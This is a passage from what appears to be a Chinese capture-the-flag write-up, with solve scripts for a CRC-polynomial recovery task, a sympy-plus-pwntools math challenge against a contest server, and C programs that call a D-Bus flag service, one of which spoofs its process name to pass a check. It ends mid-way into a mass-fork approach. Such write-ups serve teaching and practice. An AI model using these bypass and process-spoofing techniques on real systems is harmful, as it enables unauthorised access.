+<span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">final</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div> <h2 id="惜字如金-30">惜字如金 3.0</h2> <p>因为服务器会返回计算的哈希，所以其实可以随便找一行输入一个 <code class="language-plaintext highlighter-rouge">\x7f</code> 即 <code class="language-plaintext highlighter-rouge">0b01111111</code> 来直接得到 <code class="language-plaintext highlighter-rouge">flip</code> 的值（这里要简单逆一下 <code class="language-plaintext highlighter-rouge">CRC</code> 的计算，主要是要注意到 <code class="language-plaintext highlighter-rouge">\x7f</code> 输入进去后得到的结果是 <code class="language-plaintext highlighter-rouge">flip</code> 没有经过任何移位异或的结果</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># EXP 1: Recover Python code mannually
+# flag1: flag{C0mpl3ted-Th3-Pyth0n-C0de-N0w}
+</span>
+<span class="c1"># EXP 2:
+</span><span class="n">ref_hash</span> <span class="o">=</span> <span class="sh">'</span><span class="s">596b56a3bed7</span><span class="sh">'</span> <span class="c1"># row content: b'\x7f', little endian
+</span>
+<span class="c1"># change ref_hash to big endian
+</span><span class="n">ref_hash_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">ref_hash</span><span class="p">)</span>
+<span class="n">ref_hash_bytes</span> <span class="o">=</span> <span class="n">ref_hash_bytes</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">ref_hash</span> <span class="o">=</span> <span class="n">ref_hash_bytes</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">calc_hash</span><span class="p">(</span><span class="n">digest</span><span class="p">):</span>
+    <span class="n">u2</span><span class="p">,</span> <span class="n">u1</span><span class="p">,</span> <span class="n">u0</span> <span class="o">=</span> <span class="mh">0xdbeEaed4cF43</span><span class="p">,</span> <span class="mh">0xFDFECeBdeeD9</span><span class="p">,</span> <span class="mh">0xB7E85A4E5Dcd</span>
+    <span class="n">digest</span> <span class="o">=</span> <span class="p">(</span><span class="n">digest</span> <span class="o">*</span> <span class="p">(</span><span class="n">digest</span> <span class="o">*</span> <span class="n">u2</span> <span class="o">+</span> <span class="n">u1</span><span class="p">)</span> <span class="o">+</span> <span class="n">u0</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">48</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">hex</span><span class="p">(</span><span class="n">digest</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nf">calc_hash</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">ref_hash</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="c1"># 0x1 or 0xc
+</span>
+<span class="n">former</span> <span class="o">=</span> <span class="mh">0xc</span>
+<span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">ref_hash</span><span class="p">)):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+        <span class="k">if</span> <span class="nf">calc_hash</span><span class="p">((</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">idx</span><span class="p">))</span><span class="o">+</span><span class="n">former</span><span class="p">)[</span><span class="o">-</span><span class="n">idx</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">ref_hash</span><span class="p">[</span><span class="o">-</span><span class="n">idx</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+            <span class="n">former</span> <span class="o">+=</span> <span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">idx</span><span class="p">)</span>
+            <span class="k">break</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">former</span><span class="p">))</span> <span class="c1"># 0x5e2a653c94bc
+</span>
+<span class="n">former</span> <span class="o">=</span> <span class="mh">0x1</span>
+<span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">ref_hash</span><span class="p">)):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+        <span class="k">if</span> <span class="nf">calc_hash</span><span class="p">((</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">idx</span><span class="p">))</span><span class="o">+</span><span class="n">former</span><span class="p">)[</span><span class="o">-</span><span class="n">idx</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">ref_hash</span><span class="p">[</span><span class="o">-</span><span class="n">idx</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+            <span class="n">former</span> <span class="o">+=</span> <span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">idx</span><span class="p">)</span>
+            <span class="k">break</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">former</span><span class="p">))</span> <span class="c1"># 0x23cdc6e82991
+</span>
+<span class="n">ref_hash</span> <span class="o">=</span> <span class="sh">'</span><span class="s">596b56a3bed7</span><span class="sh">'</span> <span class="c1"># row content: b'\xff', little endian
+</span>
+<span class="n">possible_flip_1</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x5e2a653c94bc</span> <span class="o">^</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">48</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xffffffffff</span> <span class="c1"># 0xa12a653c94bc
+</span><span class="n">possible_flip_2</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x23cdc6e82991</span> <span class="o">^</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">48</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xffffffffff</span> <span class="c1"># 0xdccdc6e82991
+</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">calc_hash</span><span class="p">((</span><span class="n">possible_flip_1</span> <span class="o">^</span> <span class="mh">0xffffffffff</span><span class="p">)</span><span class="o">^</span><span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">48</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">ref_hash</span><span class="p">)</span> <span class="c1"># False
+</span><span class="nf">print</span><span class="p">(</span><span class="nf">calc_hash</span><span class="p">((</span><span class="n">possible_flip_2</span> <span class="o">^</span> <span class="mh">0xffffffffff</span><span class="p">)</span><span class="o">^</span><span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">48</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">ref_hash</span><span class="p">)</span> <span class="c1"># True
+</span>
+<span class="n">flip</span> <span class="o">=</span> <span class="n">possible_flip_2</span>
+
+<span class="k">def</span> <span class="nf">reverse_poly</span><span class="p">(</span><span class="n">flip_value</span><span class="p">,</span> <span class="n">degree</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="p">[</span><span class="sh">''</span><span class="p">]</span> <span class="o">*</span> <span class="n">degree</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">degree</span><span class="p">):</span>
+        <span class="nf">if </span><span class="p">(</span><span class="n">flip_value</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">B</span><span class="sh">'</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">b</span><span class="sh">'</span>
+    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="n">poly</span> <span class="o">=</span> <span class="sh">'</span><span class="s">B</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">reverse_poly</span><span class="p">(</span><span class="n">flip</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span>
+<span class="c1"># BBbbbBbbBBbbBbBbbbbbBbBBBbBBbbbBBBbBBbbBBbbBBBbBB
+</span>
+<span class="c1"># flag2: flag{Succe55fu11y-Deduced-A-CRC-Po1ynomia1}
+</span></code></pre></div></div> <h2 id="优雅的不等式">优雅的不等式</h2> <p>刷知乎最有用的一集，帖子在<a href="https://zhuanlan.zhihu.com/p/450355422?utm_psn=1838583662888742912">这里</a>公式如下</p> \[S_n = \int_0^1 \frac{(x-x^2)^{4n}(a+b\dot x^2)}{(1+x^2)} dx\] \[\frac{S_n}{4^{n-1}(a-b)} = \frac{T_n}{4^{n-1}(a-b)} - (-1)^{n-1}\pi\] \[T_n = \int_0^1 \frac{(x-x^2)^{4n}(a+bx^2)-(-4)^n(a-b)}{(1+x^2)}dx\] <p>然后就是搓代码</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sympy</span> <span class="k">as</span> <span class="n">sp</span>
+<span class="kn">from</span> <span class="n">sympy</span> <span class="kn">import</span> <span class="n">Symbol</span><span class="p">,</span> <span class="n">Function</span><span class="p">,</span> <span class="n">Eq</span><span class="p">,</span> <span class="n">solve</span><span class="p">,</span> <span class="n">Matrix</span><span class="p">,</span> <span class="n">diff</span><span class="p">,</span> <span class="n">Derivative</span><span class="p">,</span> <span class="n">integrate</span><span class="p">,</span> <span class="n">simplify</span><span class="p">,</span> <span class="n">Rational</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">construct_function</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="sh">"</span><span class="s">((x-x**2)**(4*</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">)*(</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">+</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">*x**2))</span><span class="sh">"</span>
+    <span class="n">den</span> <span class="o">=</span> <span class="sh">"</span><span class="s">(1+x**2)</span><span class="sh">"</span>
+    <span class="n">F</span> <span class="o">=</span> <span class="n">num</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/</span><span class="sh">"</span> <span class="o">+</span> <span class="n">den</span>
+    <span class="k">return</span> <span class="n">F</span>
+
+<span class="k">def</span> <span class="nf">solution</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="nc">Symbol</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="nc">Symbol</span><span class="p">(</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="nc">Symbol</span><span class="p">(</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="n">F_T</span> <span class="o">=</span> <span class="p">((</span><span class="n">x</span><span class="o">-</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">n</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">*</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">**</span><span class="n">n</span><span class="o">*</span><span class="p">(</span><span class="n">a</span><span class="o">-</span><span class="n">b</span><span class="p">))</span><span class="o">/</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">T</span> <span class="o">=</span> <span class="nf">integrate</span><span class="p">(</span><span class="n">F_T</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
+    <span class="n">T_str</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">T</span><span class="p">)</span>
+
+    <span class="n">a_loc</span> <span class="o">=</span> <span class="n">T_str</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">b_loc</span> <span class="o">=</span> <span class="n">T_str</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">blank_loc</span> <span class="o">=</span> <span class="n">T_str</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="n">num_a</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">T_str</span><span class="p">[:</span><span class="n">a_loc</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">den_a</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">T_str</span><span class="p">[</span><span class="n">a_loc</span><span class="o">+</span><span class="mi">2</span><span class="p">:</span><span class="n">blank_loc</span><span class="p">])</span>
+    <span class="n">num_b</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">T_str</span><span class="p">[</span><span class="n">blank_loc</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">b_loc</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">))</span>
+    <span class="n">den_b</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">T_str</span><span class="p">[</span><span class="n">b_loc</span><span class="o">+</span><span class="mi">2</span><span class="p">:])</span>
+
+    <span class="n">coef_a</span> <span class="o">=</span> <span class="nc">Rational</span><span class="p">(</span><span class="n">num_a</span><span class="p">,</span><span class="n">den_a</span><span class="p">)</span>
+    <span class="n">coef_b</span> <span class="o">=</span> <span class="nc">Rational</span><span class="p">(</span><span class="n">num_b</span><span class="p">,</span><span class="n">den_b</span><span class="p">)</span>
+
+    <span class="n">eq_1</span> <span class="o">=</span> <span class="nc">Eq</span><span class="p">(</span><span class="nc">Rational</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="n">a</span><span class="o">-</span><span class="n">b</span><span class="p">),</span> <span class="nc">Rational</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+    <span class="n">eq_2</span> <span class="o">=</span> <span class="nc">Eq</span><span class="p">(</span><span class="nc">Rational</span><span class="p">(</span><span class="n">coef_a</span><span class="p">)</span> <span class="o">*</span> <span class="n">a</span> <span class="o">+</span> <span class="nc">Rational</span><span class="p">(</span><span class="n">coef_b</span><span class="p">)</span> <span class="o">*</span> <span class="n">b</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+    <span class="n">solution</span> <span class="o">=</span> <span class="nf">solve</span><span class="p">((</span><span class="n">eq_1</span><span class="p">,</span> <span class="n">eq_2</span><span class="p">),</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">))</span>
+
+    <span class="n">a_val</span> <span class="o">=</span> <span class="n">solution</span><span class="p">[</span><span class="n">a</span><span class="p">]</span>
+    <span class="n">b_val</span> <span class="o">=</span> <span class="n">solution</span><span class="p">[</span><span class="n">b</span><span class="p">]</span>
+
+    <span class="k">assert</span> <span class="nc">Rational</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="n">a_val</span><span class="o">-</span><span class="n">b_val</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">,</span> <span class="sh">'</span><span class="s">a and b must satisfy the first equation</span><span class="sh">'</span>
+    <span class="k">assert</span> <span class="nc">Rational</span><span class="p">(</span><span class="n">coef_a</span><span class="p">)</span> <span class="o">*</span> <span class="n">a_val</span> <span class="o">+</span> <span class="nc">Rational</span><span class="p">(</span><span class="n">coef_b</span><span class="p">)</span> <span class="o">*</span> <span class="n">b_val</span> <span class="o">==</span> <span class="n">value</span><span class="p">,</span> <span class="sh">'</span><span class="s">a and b must satisfy the second equation</span><span class="sh">'</span>
+
+    <span class="k">assert</span> <span class="n">a_val</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">a must be positive</span><span class="sh">'</span>
+    <span class="k">assert</span> <span class="n">b_val</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">b must be positive</span><span class="sh">'</span>
+
+    <span class="n">F</span> <span class="o">=</span> <span class="nf">construct_function</span><span class="p">(</span><span class="n">a_val</span><span class="p">,</span> <span class="n">b_val</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+    <span class="n">_F</span> <span class="o">=</span> <span class="n">sp</span><span class="p">.</span><span class="n">parsing</span><span class="p">.</span><span class="n">sympy_parser</span><span class="p">.</span><span class="nf">parse_expr</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
+    <span class="k">assert</span> <span class="n">sp</span><span class="p">.</span><span class="nf">simplify</span><span class="p">(</span><span class="n">sp</span><span class="p">.</span><span class="nf">integrate</span><span class="p">(</span><span class="n">_F</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="o">-</span> <span class="p">(</span><span class="n">sp</span><span class="p">.</span><span class="n">pi</span> <span class="o">+</span> <span class="n">value</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> \
+        <span class="sh">'</span><span class="s">The function must satisfy the integral equation: </span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">sp</span><span class="p">.</span><span class="nf">integrate</span><span class="p">(</span><span class="n">_F</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">F</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="sh">'</span><span class="s">202.38.93.141</span><span class="sh">'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">14514</span>
+<span class="n">token</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">token:</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">for</span> <span class="nb">round</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">40</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Round: </span><span class="si">{</span><span class="nb">round</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">conn</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">pi&gt;=</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">pi_value_str</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">).</span><span class="nf">strip</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span>
+    <span class="k">if</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">pi_value_str</span><span class="p">:</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">4*((1-x**2)**(1/2)-(1-x))</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">continue</span>
+    <span class="n">num</span><span class="p">,</span> <span class="n">den</span> <span class="o">=</span> <span class="nf">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">pi_value_str</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">))</span>
+    <span class="n">value</span> <span class="o">=</span> <span class="nc">Rational</span><span class="p">(</span><span class="o">-</span><span class="n">num</span><span class="p">,</span> <span class="n">den</span><span class="p">)</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">F</span> <span class="o">=</span> <span class="nf">solution</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+            <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+            <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">F</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+            <span class="k">break</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="n">n</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">if</span> <span class="nb">round</span> <span class="o">==</span> <span class="mi">39</span><span class="p">:</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div> <h2 id="不太分布式的软总线">不太分布式的软总线</h2> <p>我是 prompt engineering 大师，GPT-o1 爆了这道题</p> <h3 id="what-dbus-gonna-do">What DBus Gonna Do?</h3> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+dbus-send <span class="nt">--print-reply</span> <span class="nt">--system</span> <span class="se">\</span>
+	<span class="nt">--dest</span><span class="o">=</span>cn.edu.ustc.lug.hack.FlagService <span class="se">\</span>
+	/cn/edu/ustc/lug/hack/FlagService <span class="se">\</span>
+	cn.edu.ustc.lug.hack.FlagService.GetFlag1 <span class="se">\</span>
+	string:<span class="s2">"Please give me flag1"</span>
+</code></pre></div></div> <h3 id="if-i-could-be-a-file-descriptor">If I Could Be A File Descriptor</h3> <pre><code class="language-C">#include &lt;gio/gio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+
+#define DEST "cn.edu.ustc.lug.hack.FlagService"
+#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
+#define METHOD "GetFlag2"
+#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"
+
+int main() {
+    GError *error = NULL;
+    GDBusConnection *connection;
+    GVariant *result;
+
+    // 连接到 DBus 系统总线
+    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &amp;error);
+    if (!connection) {
+        g_printerr("Failed to connect to the system bus: %s\n", error-&gt;message);
+        g_error_free(error);
+        return EXIT_FAILURE;
+    }
+
+    // 创建内存中的管道，直接写入请求内容 "Please give me flag2\n"
+    int pipe_fds[2];
+    if (pipe(pipe_fds) == -1) {
+        perror("Failed to create pipe");
+        return EXIT_FAILURE;
+    }
+    
+    const char *request = "Please give me flag2\n";
+    ssize_t written = write(pipe_fds[1], request, 21);  // 确保写入 21 个字节，包括换行符
+    close(pipe_fds[1]); // 关闭写端，只保留读端
+
+    if (written != 21) {
+        fprintf(stderr, "Failed to write the full message to the pipe\n");
+        close(pipe_fds[0]);
+        return EXIT_FAILURE;
+    }
+
+    // 使用 DBus 调用 GetFlag2 方法，传递文件描述符
+    GUnixFDList *fd_list = g_unix_fd_list_new_from_array(&amp;pipe_fds[0], 1);
+    result = g_dbus_connection_call_with_unix_fd_list_sync(
+        connection,
+        DEST,
+        OBJECT_PATH,
+        INTERFACE,
+        METHOD,
+        g_variant_new("(h)", 0),
+        NULL,
+        G_DBUS_CALL_FLAGS_NONE,
+        -1,
+        fd_list,
+        NULL,
+        NULL,
+        &amp;error
+    );
+
+    if (result) {
+        gchar *flag;
+        g_variant_get(result, "(s)", &amp;flag);
+        g_print("Flag 2: %s\n", flag);
+        g_free(flag);
+        g_variant_unref(result);
+    } else {
+        g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error-&gt;message);
+        g_error_free(error);
+    }
+
+    g_object_unref(fd_list);
+    close(pipe_fds[0]);
+    g_object_unref(connection);
+    return 0;
+}
+</code></pre> <h3 id="comm-say-maybe">Comm Say Maybe</h3> <pre><code class="language-C">#define _GNU_SOURCE
+#include &lt;gio/gio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/prctl.h&gt;
+
+#define DEST "cn.edu.ustc.lug.hack.FlagService"
+#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
+#define METHOD "GetFlag3"
+#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"
+
+int main() {
+    // 使用 exec 调整进程名为 "getflag3"
+    if (prctl(PR_SET_NAME, "getflag3", 0, 0, 0) != 0) {
+        perror("Failed to set process name");
+        return EXIT_FAILURE;
+    }
+
+    GError *error = NULL;
+    GDBusConnection *connection;
+    GVariant *result;
+
+    // 连接到 DBus 系统总线
+    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &amp;error);
+    if (!connection) {
+        g_printerr("Failed to connect to the system bus: %s\n", error-&gt;message);
+        g_error_free(error);
+        return EXIT_FAILURE;
+    }
+
+    // 调用 GetFlag3 方法
+    result = g_dbus_connection_call_sync(
+        connection,
+        DEST,
+        OBJECT_PATH,
+        INTERFACE,
+        METHOD,
+        NULL,  // 无参数
+        G_VARIANT_TYPE("(s)"),  // 期望返回类型为字符串
+        G_DBUS_CALL_FLAGS_NONE,
+        -1,
+        NULL,
+        &amp;error
+    );
+
+    // 检查返回结果
+    if (result) {
+        gchar *flag;
+        g_variant_get(result, "(s)", &amp;flag);
+        g_print("Flag 3: %s\n", flag);
+        g_free(flag);
+        g_variant_unref(result);
+    } else {
+        g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error-&gt;message);
+        g_error_free(error);
+    }
+
+    g_object_unref(connection);
+    return 0;
+}
+</code></pre> <h2 id="动画分享">动画分享</h2> <p>不明不白的就出了第一个 <code class="language-plaintext highlighter-rouge">flag</code>，就简单尝试了下疯狂 fork</p> <pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
